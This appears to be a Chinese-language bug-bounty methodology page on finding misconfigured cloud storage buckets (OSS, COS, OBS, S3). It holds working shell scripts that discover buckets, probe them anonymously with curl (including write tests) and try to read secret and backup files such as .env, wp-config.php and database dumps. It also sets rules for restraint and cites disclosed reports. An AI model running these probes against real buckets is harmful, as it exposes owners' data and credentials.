# 对象存储深挖(OSS / COS / OBS / S3) — payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:bucket 批量发现、**用错误响应判定权限矩阵**、敏感 key 猎杀。基础错配打法(匿名列举 / 公开写 / CNAME 接管)在 [`../ssrf-cache-host/11-cloud.md`](../ssrf-cache-host/11-cloud.md) §cloud-s3-misconfig 与 §cn-object-storage,**先读那两个场景**,本文件只做增补与系统化。

**WSTG / CWE 映射**(报告时填 `../../templates/report-submission.md` 对应字段;WSTG 标到类级):

| 场景 | WSTG | CWE |
|---|---|---|
| oss-bucket-discovery | WSTG-INFO | —(测绘) |
| oss-perm-matrix / oss-sensitive-keys | WSTG-CONF | CWE-732(关键资源权限错配) / CWE-200 |

---

### bucket 批量发现与归属  `oss-bucket-discovery`

从子域 / JS / 抓包 / 证书里系统化提取 bucket 域名并归属到云厂商——11-cloud 的域名规律表是单点查询,这里是批量管线。
子类:**对象存储测绘** · tags: `OSS` `COS` `S3` `测绘` `bucket`

**前置条件:** Phase 3 资产矩阵;JS 代码包(见 methodology/07-js-recon.md)

**攻击链:**

**1. 批量提取**
_正则扫 JS / 抓包导出 / HTTP 存档_
```
grep -rhoE "[a-z0-9][a-z0-9-]{2,62}\.oss-[a-z0-9-]+\.aliyuncs\.com"      {CORPUS} | sort -u
grep -rhoE "[a-z0-9][a-z0-9-]{2,62}\.cos\.[a-z0-9-]+\.myqcloud\.com"     {CORPUS} | sort -u
grep -rhoE "[a-z0-9][a-z0-9-]{2,62}\.s3[.-][a-z0-9-]*\.?amazonaws\.com"  {CORPUS} | sort -u
grep -rhoE "[a-z0-9][a-z0-9-]{2,62}\.obs\.[a-z0-9-]+\.myhuaweicloud\.com" {CORPUS} | sort -u
# CORPUS = 全部 JS bundle + har 导出 + wayback 历史响应(Phase 2 产物)
```

**2. 从子域反推**
_CNAME 指向 bucket 的子域,连同悬挂一起记_
```
for sub in $(cat subs.txt); do
  cn=$(dig +short CNAME "$sub" | grep -E "aliyuncs|myqcloud|amazonaws|myhuaweicloud")
  [ -n "$cn" ] && echo "$sub -> $cn"
done | tee bucket-cname.txt
# 含 NoSuchBucket 的行 → 接管候选(见 11-cloud §cn-object-storage 第 3 步)
```

**3. 产出表**
_每个 bucket 一行,喂给权限判定矩阵_
```
bucket 域名 | 发现来源 | 云厂商 | 业务猜测(assets/backup/upload)
```

---

### 权限判定矩阵  `oss-perm-matrix`

黑盒判定一个 bucket 的匿名权限:用**错误响应的差异**区分"可列 / 可读 / 可写 / 不存在",无需任何凭据。
子类:**对象存储权限** · tags: `OSS` `COS` `S3` `错配判定`

**前置条件:** bucket 域名清单(上一个场景产出)

**攻击链:**

**1. 三探针定权限**
_每次判定只发 3 个请求,响应语义见注释_
```
# 探针 1:列根(测 ListObjects)
curl -s "https://{BUCKET}/?max-keys=10" -o /dev/null -w "%{http_code}\n"
# 200 + ListBucketResult = 匿名可列(高危起点)

# 探针 2:读不存在 key(测 GetObject 的错误语义)
curl -s "https://{BUCKET}/nonexist-security-probe-$(date +%s)" -o /dev/null -w "%{http_code}\n"
# 404 NoSuchKey      = 匿名可读(关键!桶拒绝列出但可直读)
# 403 AccessDenied   = 匿名读被禁

# 探针 3:写无害对象(测 PutObject,绝不覆盖既有 key)
curl -s -X PUT "https://{BUCKET}/security-test-$(date +%s).txt" -d "poc" -o /dev/null -w "%{http_code}\n"
# 200 = 匿名可写(Critical);403 = 写被禁
# 写权限验证后立即删除该对象并记录(00-index.md 清理义务)
```

**2. 判定矩阵解读**
```
| 列根 | 读不存在key | 写 | 结论                          |
|------|------------|----|------------------------------|
| 200  | 404 NoSuchKey | 403 | 公开读,不可列 → 走 key 猎杀 |
| 200  | 404 NoSuchKey | 200 | 完全公开读写 → Critical     |
| 403  | 404 NoSuchKey | 403 | 仅可读不可列(常见!)→ 猎杀   |
| 403  | 403 AccessDenied | 403 | 配置正常,转向 AK 面     |
| —    | — | — | 404 NoSuchBucket → 接管候选  |
```

**3. 已认证用户的越桶读**
_部分策略允许任意登录账号读(AuthenticatedUsers / 所有子账号),拿自己测试 AK 验证_
```
# 用自己的(同厂商任意账号)凭据读目标桶——不属于匿名错配,属于策略过宽
aws s3 cp "s3://{BUCKET}/{KEY}" - --no-sign-request 2>/dev/null \
  || aws s3 cp "s3://{BUCKET}/{KEY}" -   # 带(合法自有)凭据再试一次
# 命中 → 报告写"策略允许任意认证身份",不是匿名,定级相应下调
```

---

### 敏感 key 猎杀  `oss-sensitive-keys`

对"可读不可列"的桶,按 key 字典与命名规律直读。这是国内备份泄露的最高产入口。
子类:**对象存储权限** · tags: `OSS` `COS` `备份泄露` `key字典`

**前置条件:** 判定矩阵显示可读不可列

**攻击链:**

**1. key 字典直读**
_备份 / 配置 / 日志的高频命名(日期占位逐日回溯)_
```
KEYS="
backup.sql backup.sql.gz backup.zip dump.sql db_backup.sql.gz
backup-$(date +%Y%m%d).sql.gz db-$(date +%Y%m%d).sql.gz
.env .env.production application.yml application.properties
config.json settings.py wp-config.php
log/access.log logs/error.log access.log-$(date +%Y%m%d)
site-$(date +%Y%m%d).tar.gz www-$(date +%Y%m%d).tar.gz
mysql-$(date +%Y%m%d).sql.gz
"
for k in $KEYS; do
  code=$(curl -s "https://{BUCKET}/$k" -o /dev/null -w "%{http_code}")
  [ "$code" = "200" ] && echo "[HIT] $k"
done
```

**2. 目录规律递推**
_命中一个 key 后,按其目录结构横向推_
```
# 命中 backup/2025/backup.sql.gz → 递归试
for m in $(seq 1 12); do
  curl -s "https://{BUCKET}/backup/2025-$m/backup.sql.gz" -o /dev/null -w "%{http_code} $m\n"
done
# 列举被禁时按月枚举 = 温和遍历(≤12 请求/目录,见证据纪律限速要求)
```

**3. 影响证明纪律**
_读到敏感文件后:一条脱敏记录即停_
```
# 备份文件:报告里写"可下载 {SIZE}MB 的 db_backup.sql.gz,含 users 表",
# 附脱敏表头截图,不下载数据正文,不遍历全部历史备份
```

**WAF/EDR 绕过变体:**

**1. 前端直传接口反推 key 结构**
_应用自己的上传接口会暴露 key 命名规律_
```
# 正常上传一个文件,抓响应里的 object key
# → 得到 "{userid}/{timestamp}.{ext}" 类规律 → 反推同目录他人文件可否直读
# (这同时是 IDOR 链:改 key 里的 userid 读他人对象,归 arbitrary-x-authz 交叉)
```

---

## 不要做的事(对象存储红线)

- **禁**:覆盖 / 删除任何既有对象(写验证只用自命名新 key,验完即删)
- **禁**:把公开读桶整桶同步到本地(证据 = 1–2 条脱敏样本 + 文件清单)
- **禁**:遍历他人上传目录里的用户内容(用户 PII,扫到即停并脱敏,见 evidence-discipline §8)
- **禁**:接管验证在目标自己的 CNAME 上做(接管演示只对自己账号下的悬挂记录做)

---

## H1 真实案例

_5 份 HackerOne 已披露 High/Critical 报告命中对象存储面_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | — | Ruby | [Open aws s3 bucket s3://rubyci](https://hackerone.com/reports/257276) | Ruby CI 的 S3 桶完全公开——桶级错配的经典定级样本 |
| High | — | Ruby | [Source code disclosed via S3 Bucket](https://hackerone.com/reports/778931) | S3 桶直接暴露源码（备份/打包产物入桶是高频根因） |
| High | — | Rockset | [S3 bucket data reveals user addresses based on latitudes and longitudes](https://hackerone.com/reports/947725) | 支持桶匿名可列，含用户地理位置数据 |
| High | — | Starbucks | [Subdomain takeover on happymondays.starbucks.com due to non-used AWS S3 DNS record](https://hackerone.com/reports/186766) | 废弃 S3 DNS 记录 → 子域接管 |
| High | — | U.S. Dept Of Defense | [AWS subdomain takeover of www.███████](https://hackerone.com/reports/1329792) | AWS 侧子域接管（政府项目样本） |

**来源分组（h1-reports/by-weakness/）：**

- information-disclosure：2 条
- privilege-escalation：1 条
- improper-access-control-generic：1 条
- information-exposure-through-directory-listing：1 条

---

← 回 [00-index.md](00-index.md) · 相关:[`20-iam.md`](20-iam.md) · [`../ssrf-cache-host/11-cloud.md`](../ssrf-cache-host/11-cloud.md)
